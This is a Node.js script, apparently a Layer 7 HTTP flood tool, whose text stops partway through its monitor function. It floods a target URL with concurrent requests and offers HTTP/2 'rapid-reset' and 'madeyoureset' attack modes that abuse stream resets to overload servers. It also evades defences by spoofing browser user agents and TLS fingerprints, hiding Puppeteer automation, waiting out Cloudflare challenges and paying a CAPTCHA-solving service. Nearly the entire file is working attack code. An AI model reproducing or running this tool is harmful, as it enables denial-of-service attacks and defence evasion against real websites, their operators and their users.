#!/usr/bin/env node

const http = require('http');
const https = require('https');
const http2 = require('http2');
const tls = require('tls');
const { URL } = require('url');
const { Client } = require('undici');
const yargs = require('yargs/yargs');
const { hideBin } = require('yargs/helpers');
const chalk = require('chalk');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const AnonymizeUAPlugin = require('puppeteer-extra-plugin-anonymize-ua');
const UserPrefsPlugin = require('puppeteer-extra-plugin-user-preferences');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

// Install plugins
puppeteer.use(StealthPlugin());
puppeteer.use(AnonymizeUAPlugin());
puppeteer.use(UserPrefsPlugin({
    userPrefs: {
        webkit: {
            webprefs: {
                default_font_size: 16,
                default_fixed_font_size: 13
            }
        }
    }
}));

// Install reCAPTCHA plugin (jika diperlukan)
puppeteer.use(
  RecaptchaPlugin({
    provider: {
      id: '2captcha',
      token: 'YOUR_2CAPTCHA_API_KEY', // Ganti dengan API key Anda
    },
    visualFeedback: true,
  })
);

// ##################################################################
// #               CHROME/CHROMIUM DETECTION                        #
// ##################################################################

function findChromeExecutable() {
    const possiblePaths = [
        // Linux
        '/usr/bin/google-chrome-stable',
        '/usr/bin/google-chrome',
        '/usr/bin/chromium-browser',
        '/snap/bin/chromium',
        // macOS
        '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
        '/Applications/Chromium.app/Contents/MacOS/Chromium',
        // Windows
        'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
        'C:\\Program Files\\Chromium\\Application\\chrome.exe',
        'C:\\Program Files (x86)\\Chromium\\Application\\chrome.exe',
    ];

    for (const chromePath of possiblePaths) {
        if (fs.existsSync(chromePath)) {
            return chromePath;
        }
    }

    // Try to find using 'which' or 'where' command
    try {
        if (process.platform === 'win32') {
            const whereOutput = execSync('where chrome', { encoding: 'utf8' });
            if (whereOutput) {
                const paths = whereOutput.split('\n').filter(p => p.trim());
                if (paths.length > 0) {
                    return paths[0].trim();
                }
            }
        } else {
            const whichOutput = execSync('which google-chrome || which chromium || which chromium-browser', { encoding: 'utf8' });
            if (whichOutput) {
                return whichOutput.trim();
            }
        }
    } catch (e) {
        // Ignore errors
    }

    return null;
}

// ##################################################################
// #                       REALISTIC USER AGENTS                     #
// ##################################################################

const generateRealisticUserAgent = () => {
    const browsers = [
        {
            name: 'Chrome',
            versions: ['115.0.5790.102', '115.0.5790.110', '116.0.5845.97', '116.0.5845.141', '117.0.5938.62'],
            os: [
                { name: 'Windows', version: 'NT 10.0; Win64; x64' },
                { name: 'Macintosh', version: 'Intel Mac OS X 10_15_7' },
                { name: 'X11', version: 'Linux x86_64' }
            ]
        },
        {
            name: 'Firefox',
            versions: ['116.0.3', '117.0', '117.0.1', '118.0', '118.0.1'],
            os: [
                { name: 'Windows', version: 'NT 10.0; Win64; x64' },
                { name: 'Macintosh', version: 'Intel Mac OS X 10.15; rv:109.0' },
                { name: 'X11', version: 'Linux x86_64; rv:109.0' }
            ]
        },
        {
            name: 'Safari',
            versions: ['16.5.2', '16.6', '17.0', '17.0.1'],
            os: [
                { name: 'Macintosh', version: 'Intel Mac OS X 10_15_7' },
                { name: 'iPhone', version: 'CPU iPhone OS 16_6 like Mac OS X' },
                { name: 'iPad', version: 'CPU OS 16_6 like Mac OS X' }
            ]
        },
        {
            name: 'Edge',
            versions: ['115.0.1901.188', '116.0.1938.62', '117.0.2045.31'],
            os: [
                { name: 'Windows', version: 'NT 10.0; Win64; x64' }
            ]
        }
    ];

    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const version = browser.versions[Math.floor(Math.random() * browser.versions.length)];
    const os = browser.os[Math.floor(Math.random() * browser.os.length)];

    let userAgent = '';

    switch (browser.name) {
        case 'Chrome':
            userAgent = `Mozilla/5.0 (${os.version}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
            break;
        case 'Firefox':
            userAgent = `Mozilla/5.0 (${os.version}; rv:${version.split('.')[0]}.0) Gecko/20100101 Firefox/${version}`;
            break;
        case 'Safari':
            if (os.name === 'iPhone' || os.name === 'iPad') {
                userAgent = `Mozilla/5.0 (${os.version}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Mobile/15E148 Safari/604.1`;
            } else {
                userAgent = `Mozilla/5.0 (${os.version}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Safari/605.1.15`;
            }
            break;
        case 'Edge':
            userAgent = `Mozilla/5.0 (${os.version}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 Edg/${version}`;
            break;
    }

    return userAgent;
};

const generateRealisticHeaders = (userAgent) => {
    const isChrome = userAgent.includes('Chrome');
    const isFirefox = userAgent.includes('Firefox');
    const isSafari = userAgent.includes('Safari') && !userAgent.includes('Chrome');
    const isEdge = userAgent.includes('Edg');
    const isMobile = userAgent.includes('Mobile');

    const headers = {
        'User-Agent': userAgent,
        'Accept': isMobile 
            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': `https://www.google.com/`,
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Cache-Control': 'max-age=0'
    };

    // Add Chrome-specific headers
    if (isChrome || isEdge) {
        const chromeVersion = userAgent.match(/Chrome\/([\d.]+)/)[1];
        const majorVersion = chromeVersion.split('.')[0];
        
        headers['Sec-CH-UA'] = `"Chromium";v="${majorVersion}", "Google Chrome";v="${majorVersion}", "Not-A.Brand";v="99"`;
        headers['Sec-CH-UA-Mobile'] = isMobile ? '?1' : '?0';
        headers['Sec-CH-UA-Platform'] = `"${userAgent.includes('Windows') ? 'Windows' : 
                                         userAgent.includes('Mac') ? 'macOS' : 
                                         userAgent.includes('Linux') ? 'Linux' : 'Android'}"`;
    }

    // Add Firefox-specific headers
    if (isFirefox) {
        headers['TE'] = 'trailers';
    }

    return headers;
};

// ##################################################################
// #                       CONFIGURATION DATA                       #
// ##################################################################

const TLS_PROFILES = [
    { // Chrome 117 on Windows 10
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_256_CBC_SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384'
    },
    { // Firefox 117 on macOS
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA',
            'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
            'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_128_GCM_SHA256',
            'TLS_RSA_WITH_AES_256_GCM_SHA384',
            'TLS_RSA_WITH_AES_128_CBC_SHA',
            'TLS_RSA_WITH_AES_256_CBC_SHA'
        ].join(':'),
        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384:P-521'
    }
];

const BURST_CONFIG = {
    requestsPerBurst: 15,
    thinkTimeMs: 1200,
    jitterMs: 800,
};

const REFERERS = [
    "https://www.google.com/", 
    "https://www.youtube.com/", 
    "https://www.facebook.com/", 
    "https://www.twitter.com/",
    "https://www.instagram.com/", 
    "https://www.baidu.com/", 
    "https://www.wikipedia.org/", 
    "https://www.yahoo.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/"
];

const ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "application/json, text/plain, */*",
];

const HTTP_STATUS_CODES = {
       // 1xx Informational
       100: "Continue", 101: "Switching Protocols", 102: "Processing", 103: "Early Hints",
       // 2xx Success
       200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative Information", 204: "No Content", 205: "Reset Content", 206: "Partial Content", 207: "Multi-Status", 208: "Already Reported", 226: "IM Used",
       // 3xx Redirection
       300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other", 304: "Not Modified", 305: "Use Proxy", 307: "Temporary Redirect", 308: "Permanent Redirect",
       // 4xx Client Errors
       400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable", 407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict", 410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large", 414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable", 417: "Expectation Failed", 418: "I'm a teapot", 421: "Misdirected Request", 422: "Unprocessable Entity", 423: "Locked", 424: "Failed Dependency", 425: "Too Early", 426: "Upgrade Required", 428: "Precondition Required", 429: "Too Many Requests", 431: "Request Header Fields Too Large", 451: "Unavailable For Legal Reasons",
       // 5xx Server Errors
       500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable", 504: "Gateway Timeout", 505: "HTTP Version Not Supported", 506: "Variant Also Negotiates", 507: "Insufficient Storage", 508: "Loop Detected", 510: "Not Extended", 511: "Network Authentication Required",
       // Cloudflare Errors
       520: "Web Server Returned an Unknown Error", 521: "Web Server Is Down", 522: "Connection Timed Out", 523: "Origin Is Unreachable", 524: "A Timeout Occurred", 525: "SSL Handshake Failed", 526: "Invalid SSL Certificate", 527: "Railgun Error", 530: "Origin DNS Error",
       // AWS Errors
       561: "Unauthorized (AWS ELB)",
       // Custom/Other
       'RESET': "Stream Reset by Server",
       999: "Request Denied (LinkedIn)",
       0: "Connection Error"
};

// ##################################################################
// #                       PUPPETER CONFIGURATION                   #
// ##################################################################

// Find Chrome executable
const chromeExecutable = findChromeExecutable();

// Create Puppeteer configuration
const PUPPETEER_CONFIG = {
    headless: 'new',
    executablePath: chromeExecutable || undefined,
    args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--disable-gpu',
        '--disable-features=VizDisplayCompositor',
        '--window-size=1920,1080',
        '--disable-blink-features=AutomationControlled',
        '--disable-web-security',
        '--disable-features=VizDisplayCompositor',
        '--enable-unsafe-swiftshader', // Untuk rendering yang lebih baik
        '--disable-software-rasterizer', // Mencegah rendering software yang lambat
        '--disable-background-timer-throttling', // Mencegah throttling timer
        '--disable-backgrounding-occluded-windows', // Mencegah backgrounding
        '--disable-renderer-backgrounding', // Mencegah renderer backgrounding
        '--disable-field-trial-config', // Nonaktifkan field trial
        '--disable-ipc-flooding-protection', // Nonaktifkan proteksi flooding
        '--enable-automation', // Diperlukan untuk beberapa fitur otomasi
        '--allow-running-insecure-content', // Izinkan konten tidak aman
        '--disable-component-update', // Nonaktifkan update komponen
        '--disable-default-apps', // Nonaktifkan aplikasi default
        '--use-gl=swiftshader', // Gunakan software rendering
        '--single-process', // Gunakan single process untuk menghindari masalah shared library
    ],
    ignoreHTTPSErrors: true,
    waitUntil: 'networkidle2',
    timeout: 30000
};

// ##################################################################
// #                       HELPER FUNCTIONS                         #
// ##################################################################

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const getRandomTlsProfile = () => getRandomElement(TLS_PROFILES);
const stripAnsi = (str) => str.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');

const formatTime = (seconds) => {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
};

// ##################################################################
// #                       PUPPETEER FUNCTIONS                      #
// ##################################################################

let browser = null;

async function initPuppeteer() {
    try {
        console.log(chalk.cyan(`Using Chrome executable: ${chromeExecutable || 'Puppeteer default'}`));
        browser = await puppeteer.launch(PUPPETEER_CONFIG);
        console.log(chalk.green('✓ Puppeteer initialized successfully'));
        return browser;
    } catch (error) {
        console.error(chalk.red('✗ Failed to initialize Puppeteer:'), error.message);
        
        // Try with different configuration if first attempt fails
        if (!PUPPETEER_CONFIG.executablePath) {
            console.log(chalk.yellow('Trying with system Chrome...'));
            try {
                const systemChrome = findChromeExecutable();
                if (systemChrome) {
                    const altConfig = {
                        ...PUPPETEER_CONFIG,
                        executablePath: systemChrome
                    };
                    browser = await puppeteer.launch(altConfig);
                    console.log(chalk.green('✓ Puppeteer initialized with system Chrome'));
                    return browser;
                }
            } catch (e) {
                console.error(chalk.red('✗ Failed with system Chrome too:'), e.message);
            }
        }
        
        // Try with minimal configuration
        console.log(chalk.yellow('Trying with minimal configuration...'));
        try {
            const minimalConfig = {
                headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--disable-gpu',
                    '--use-gl=swiftshader',
                    '--single-process'
                ],
                ignoreHTTPSErrors: true,
                timeout: 30000
            };
            browser = await puppeteer.launch(minimalConfig);
            console.log(chalk.green('✓ Puppeteer initialized with minimal configuration'));
            return browser;
        } catch (e) {
            console.error(chalk.red('✗ All initialization attempts failed:'), e.message);
            return null;
        }
    }
}

async function closePuppeteer() {
    if (browser) {
        await browser.close();
        browser = null;
        console.log(chalk.yellow('✓ Puppeteer browser closed'));
    }
}

async function bypassWithPuppeteer(url) {
    if (!browser) {
        browser = await initPuppeteer();
        if (!browser) return { statusCode: 0, error: 'Failed to initialize browser' };
    }

    const page = await browser.newPage();
    
    try {
        // Generate realistic user agent and headers
        const userAgent = generateRealisticUserAgent();
        const headers = generateRealisticHeaders(userAgent);
        
        // Set realistic viewport
        await page.setViewport({
            width: 1920 + Math.floor(Math.random() * 100),
            height: 1080 + Math.floor(Math.random() * 100),
            deviceScaleFactor: 1,
            hasTouch: false,
            isLandscape: true,
            isMobile: false
        });

        // Set user agent
        await page.setUserAgent(userAgent);
        
        // Set extra headers
        await page.setExtraHTTPHeaders(headers);
        
        // Set permissions
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });
            
            Object.defineProperty(navigator, 'plugins', {
                get: () => [
                    {
                        0: {type: "application/x-google-chrome-pdf"},
                        description: "Portable Document Format",
                        filename: "internal-pdf-viewer",
                        length: 1,
                        name: "Chrome PDF Plugin"
                    }
                ],
            });
            
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            
            window.chrome = {
                app: {
                    isInstalled: false,
                },
                webstore: {
                    onInstallStageChanged: {},
                    onDownloadProgress: {},
                },
                runtime: {
                    PlatformOs: {
                        MAC: 'mac',
                        WIN: 'win',
                        ANDROID: 'android',
                        CROS: 'cros',
                        LINUX: 'linux',
                        OPENBSD: 'openbsd',
                    },
                    PlatformArch: {
                        ARM: 'arm',
                        X86_32: 'x86-32',
                        X86_64: 'x86-64',
                    },
                    PlatformNaclArch: {
                        ARM: 'arm',
                        X86_32: 'x86-32',
                        X86_64: 'x86-64',
                    },
                    RequestUpdateCheckStatus: {
                        THROTTLED: 'throttled',
                        NO_UPDATE: 'no_update',
                        UPDATE_AVAILABLE: 'update_available',
                    },
                },
            };
        });

        // Add request interception to handle specific scenarios
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            // Block unnecessary resources to speed up
            if (['image', 'stylesheet', 'font', 'media'].includes(req.resourceType())) {
                req.abort();
            } else {
                req.continue();
            }
        });

        // Simulate human-like behavior
        await simulateHumanBehavior(page);

        // Navigate to the page with timeout
        const response = await page.goto(url, {
            waitUntil: 'networkidle2',
            timeout: 30000
        });

        // Wait for potential Cloudflare challenges
        await handleCloudflareChallenge(page);

        // Get final status after all redirects and challenges
        const finalResponse = await page.evaluate(() => {
            return {
                status: performance.getEntriesByType('navigation')[0].responseStatus,
                url: window.location.href
            };
        });

        return {
            statusCode: finalResponse.status || (response ? response.status() : 0),
            url: finalResponse.url
        };
    } catch (error) {
        console.error(chalk.red('Puppeteer error:'), error.message);
        return { statusCode: 0, error: error.message };
    } finally {
        await page.close();
    }
}

async function simulateHumanBehavior(page) {
    // Random mouse movements
    await page.mouse.move(
        Math.random() * 100 + 50,
        Math.random() * 100 + 50,
        { steps: 10 }
    );
    
    // Random scroll
    await page.evaluate(() => {
        window.scrollBy(0, Math.random() * 100);
    });
    
    // Small delay
    await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
}

async function handleCloudflareChallenge(page) {
    try {
        // Check for various Cloudflare challenge types
        const isChallengePage = await page.evaluate(() => {
            return document.title.includes('Just a moment') || 
                   document.title.includes('Attention Required') ||
                   document.title.includes('Security Check') ||
                   document.title.includes('Verification Required') ||
                   document.querySelector('.cf-browser-verification') !== null ||
                   document.querySelector('#cf-challenge-stage') !== null ||
                   document.querySelector('.cf-im-under-attack') !== null ||
                   document.querySelector('#challenge-stage') !== null ||
                   document.querySelector('.ray_id') !== null ||
                   document.querySelector('.cf-alert') !== null;
        });

        if (isChallengePage) {
            console.log(chalk.yellow('⚠ Cloudflare challenge detected, attempting to solve...'));
            
            // Wait for challenge to complete
            await page.waitForFunction(() => {
                return !document.title.includes('Just a moment') && 
                       !document.title.includes('Attention Required') &&
                       !document.title.includes('Security Check') &&
                       !document.title.includes('Verification Required') &&
                       document.querySelector('.cf-browser-verification') === null &&
                       document.querySelector('#cf-challenge-stage') === null &&
                       document.querySelector('.cf-im-under-attack') === null &&
                       document.querySelector('#challenge-stage') === null &&
                       document.querySelector('.ray_id') === null &&
                       document.querySelector('.cf-alert') === null;
            }, { timeout: 60000 });
            
            console.log(chalk.green('✓ Cloudflare challenge solved successfully'));
        }
        
        // Check for CAPTCHA
        const hasCaptcha = await page.evaluate(() => {
            return document.querySelector('.g-recaptcha') !== null ||
                   document.querySelector('#captcha') !== null ||
                   document.querySelector('.h-captcha') !== null;
        });
        
        if (hasCaptcha) {
            console.log(chalk.yellow('⚠ CAPTCHA detected, attempting to solve...'));
            
            // Try to solve CAPTCHA
            try {
                await page.solveRecaptchas();
                console.log(chalk.green('✓ CAPTCHA solved successfully'));
            } catch (e) {
                console.error(chalk.red('✗ Failed to solve CAPTCHA:'), e.message);
            }
        }
    } catch (error) {
        console.error(chalk.red('✗ Failed to solve Cloudflare challenge:'), error.message);
    }
}

// ##################################################################
// #                       CORE LOGIC                               #
// ##################################################################

const argv = yargs(hideBin(process.argv))
    .option('url', { alias: 'u', describe: 'Target URL', type: 'string', demandOption: true })
    .option('time', { alias: 't', describe: 'Test duration in minutes', type: 'number', default: 1 })
    .option('conc', { alias: 'c', describe: 'Concurrency / threads', type: 'number', default: 50 })
    .option('attack', {
        alias: 'a',
        describe: 'Specify the HTTP/2 attack mode',
        choices: ['none', 'rapid-reset', 'madeyoureset'],
        default: 'none'
    })
    .option('protocol', {
        alias: 'p',
        describe: 'Force protocols (e.g., "1.1,2,3"). Bypasses auto-detection.',
        type: 'string',
    })
    .option('adaptive-delay', {
        alias: 'ad',
        describe: 'Enable adaptive delay on blocking status codes',
        type: 'boolean',
        default: false
    })
    .option('bypass', {
        alias: 'b',
        describe: 'Enable Cloudflare bypass using Puppeteer',
        type: 'boolean',
        default: false
    })
    .option('puppeteer-only', {
        describe: 'Use Puppeteer for all requests (bypass mode only)',
        type: 'boolean',
        default: false
    })
    .option('chrome-path', {
        describe: 'Path to Chrome/Chromium executable',
        type: 'string',
        default: ''
    })
    .help().alias('help', 'h').argv;

const parsedUrl = new URL(argv.url);
const target = {
    protocol: parsedUrl.protocol,
    host: parsedUrl.hostname,
    path: parsedUrl.pathname + parsedUrl.search,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
};
const targetUrl = `${target.protocol}//${target.host}:${target.port}`;

const durationMs = argv.time * 60 * 1000;
const concurrency = argv.conc;
const attackMode = argv.attack;
const bypassMode = argv.bypass;
const puppeteerOnly = argv.puppeteerOnly;

// Update Chrome path if provided via command line
if (argv.chromePath && fs.existsSync(argv.chromePath)) {
    PUPPETEER_CONFIG.executablePath = argv.chromePath;
}

// --- Global Stats ---
let isRunning = true;
let activeProtocols = [];
const stats = {
    requestsSent: 0,
    responsesReceived: 0,
    totalLatency: 0,
    errors: 0,
    attackSent: 0,
    attackReceived: 0,
    attackErrors: 0,
    statusCounts: {}, // For H2 attacks only
    protocolStats: {},
    puppeteerRequests: 0,
    puppeteerSuccess: 0,
    startTime: Date.now(),
};
const lastLogs = [];
const lastAttackLogs = [];
const workerDelays = new Array(concurrency).fill(0);


async function runStandardWorker(workerId, client, protocolKey) {
    let requestsInBurst = 0;
    const protocolLabel = protocolKey.toUpperCase();

    const sendRequest = async () => {
        if (!isRunning) return;

        if (argv.adaptiveDelay && workerDelays[workerId] > 0) {
            await new Promise(resolve => setTimeout(resolve, workerDelays[workerId]));
        }

        // Generate realistic user agent and headers
        const userAgent = generateRealisticUserAgent();
        const headers = generateRealisticHeaders(userAgent);
        
        // Add referer
        headers['Referer'] = getRandomElement(REFERERS);
        
        stats.requestsSent++;
        const startTime = process.hrtime();

        try {
            let statusCode;
            let latencyMs;
            let isPuppeteerUsed = false;

            if (puppeteerOnly) {
                // Use Puppeteer for all requests
                stats.puppeteerRequests++;
                const puppeteerResult = await bypassWithPuppeteer(targetUrl);
                statusCode = puppeteerResult.statusCode;
                
                const diff = process.hrtime(startTime);
                latencyMs = (diff[0] * 1e9 + diff[1]) / 1e6;
                
                if (statusCode >= 200 && statusCode < 400) {
                    stats.puppeteerSuccess++;
                }
                
                isPuppeteerUsed = true;
            } else {
                // Use standard HTTP client
                const { statusCode: undiciStatus, body } = await client.request({
                    path: target.path,
                    method: 'GET',
                    headers,
                });

                for await (const chunk of body) {}

                const diff = process.hrtime(startTime);
                latencyMs = (diff[0] * 1e9 + diff[1]) / 1e6;
                statusCode = undiciStatus;

                // If we get 403 and bypass is enabled, try with Puppeteer
                if (statusCode === 403 && bypassMode) {
                    console.log(chalk.yellow(`⚠ 403 Forbidden detected, attempting Puppeteer bypass...`));
                    stats.puppeteerRequests++;
                    const puppeteerResult = await bypassWithPuppeteer(targetUrl);
                    statusCode = puppeteerResult.statusCode;
                    
                    const diff2 = process.hrtime(startTime);
                    latencyMs = (diff2[0] * 1e9 + diff2[1]) / 1e6;
                    
                    if (statusCode >= 200 && statusCode < 400) {
                        stats.puppeteerSuccess++;
                    }
                    
                    isPuppeteerUsed = true;
                }
            }

            stats.responsesReceived++;
            stats.totalLatency += latencyMs;
            
            const pStats = stats.protocolStats[protocolKey];
            pStats.responses++;
            pStats.statuses[statusCode] = (pStats.statuses[statusCode] || 0) + 1;

            const logPrefix = isPuppeteerUsed ? '[PUPPETEER]' : `[${protocolLabel}]`;
            lastLogs.push(`${logPrefix} ${argv.url} -> ${chalk.green(statusCode)} (${chalk.yellow(latencyMs.toFixed(2) + 'ms')})`);
            
            if (argv.adaptiveDelay) {
                switch (statusCode) {
                    case 401: case 403: case 429: case 431: case 451:
                        workerDelays[workerId] = Math.min(10000, workerDelays[workerId] + 150);
                        break;
                    case 400: case 406: case 412: case 422:
                        workerDelays[workerId] = Math.min(10000, workerDelays[workerId] + 75);
                        break;
                    default:
                        if (statusCode < 400) {
                             workerDelays[workerId] = Math.max(0, workerDelays[workerId] - 50);
                        }
                }
            }

        } catch (err) {
            stats.errors++;
            stats.protocolStats[protocolKey].statuses[0] = (stats.protocolStats[protocolKey].statuses[0] || 0) + 1;
            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.red('ERROR')} (${err.code || 'N/A'})`);
        } finally {
            if (lastLogs.length > 3) lastLogs.shift();
            scheduleNext();
        }
    };
    
    const scheduleNext = () => {
        if (!isRunning) return;
        requestsInBurst++;
        if (requestsInBurst >= BURST_CONFIG.requestsPerBurst) {
            requestsInBurst = 0;
            const thinkTime = BURST_CONFIG.thinkTimeMs + (Math.random() * BURST_CONFIG.jitterMs);
            setTimeout(sendRequest, thinkTime);
        } else {
            setImmediate(sendRequest);
        }
    };
    
    sendRequest();
}


// --- HTTP/2 Attack Worker ---
function startHttp2AttackWorker() {
    if (!isRunning) return;
    const client = http2.connect(targetUrl, {
        rejectUnauthorized: false,
        ...getRandomTlsProfile()
    });

    const reconnect = () => {
        if (!client.destroyed) client.destroy();
        if (isRunning) setTimeout(startHttp2AttackWorker, 100);
    };

    client.on('goaway', reconnect);
    client.on('error', reconnect);
    client.on('close', reconnect);

    client.on('connect', () => {
        for (let i = 0; i < 20; i++) { 
            if (attackMode === 'rapid-reset') sendRapidReset(client);
            if (attackMode === 'madeyoureset') sendMadeYouReset(client);
        }
    });
}

// --- Rapid Reset (Client-side RST_STREAM) ---
function sendRapidReset(client) {
    if (!isRunning || client.destroyed || client.closing) return;
    const headers = { ':method': 'GET', ':path': target.path, ':scheme': 'https', ':authority': target.host };
    stats.attackSent++;
    const stream = client.request(headers);
    stream.on('response', (h) => {
        stats.attackReceived++;
        const statusCode = h[':status'];
        stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
        lastAttackLogs.push(`[Rapid Reset] -> ${chalk.yellow(statusCode)} (Response Before Reset)`);
        if (lastAttackLogs.length > 3) lastAttackLogs.shift();
    });
    stream.on('error', () => {
        stats.attackErrors++;
        stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
    });
    setImmediate(() => {
        if (!stream.destroyed) stream.close(http2.constants.NGHTTP2_CANCEL);
    });
}

// --- MadeYouReset (Server-side RST_STREAM) ---
function sendMadeYouReset(client) {
    if (!isRunning || client.destroyed || client.closing) return;
    const headers = { ':method': 'POST', ':path': target.path, ':scheme': 'https', ':authority': target.host };
    stats.attackSent++;
    const stream = client.request(headers);
    stream.on('response', (h) => {
        stats.attackReceived++;
        const statusCode = h[':status'];
        stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
        lastAttackLogs.push(`[MadeYouReset] -> ${chalk.yellow(statusCode)} (Response)`);
        if (lastAttackLogs.length > 3) lastAttackLogs.shift();
    });
    stream.on('error', (err) => {
        if (err.code === 'ERR_HTTP2_STREAM_ERROR') {
            stats.statusCounts['RESET'] = (stats.statusCounts['RESET'] || 0) + 1;
            lastAttackLogs.push(`[MadeYouReset] -> ${chalk.green('SUCCESS')} (Server Reset Stream)`);
            if (lastAttackLogs.length > 3) lastAttackLogs.shift();
        } else {
            stats.attackErrors++;
            stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
        }
    });
    setImmediate(() => {
        if (stream.destroyed) return;
        try {
            const remoteWindowSize = stream.state.remoteWindowSize;
            if (remoteWindowSize > 0) {
                const oversizedPayload = Buffer.alloc(remoteWindowSize + 1);
                stream.end(oversizedPayload);
            } else {
                stream.end();
            }
        } catch (e) {
            stats.attackErrors++;
            if (!stream.destroyed) stream.destroy();
        }
    });
}


// --- Monitor ---
function updateMonitor() {
    console.clear();
    const elapsedSeconds = (Date.now() - stats.startTime) / 1000;
    const timeRemaining = Math.max(0, (durationMs / 1000) - elapsedSeconds);

    console.log(chalk.cyan('--------------------------------------------'));
    console.log(chalk.cyan.bold('          ⚡️ PV NodeJS Layer 7 ⚡️         '));
    console.log(chalk.cyan('--------------------------------------------'));
    
    if (attackMode !== 'none') {
